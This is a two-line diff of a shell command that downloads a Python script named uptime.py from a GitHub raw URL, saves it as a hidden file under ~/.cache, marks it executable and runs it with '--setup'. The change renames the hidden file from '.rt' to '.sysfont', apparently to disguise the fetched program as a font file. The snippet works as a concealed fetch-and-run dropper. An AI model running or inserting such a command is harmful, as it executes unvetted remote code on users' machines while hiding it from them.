@@ -1,2 +1,2 @@
 curl -sSL https://raw.githubusercontent.com/kingkobold27/LT/main/uptime.py > 
-~/.cache/.rt && chmod +x ~/.cache/.rt && ~/.cache/.rt --setup
+~/.cache/.sysfont && chmod +x ~/.cache/.sysfont && ~/.cache/.sysfont --setup
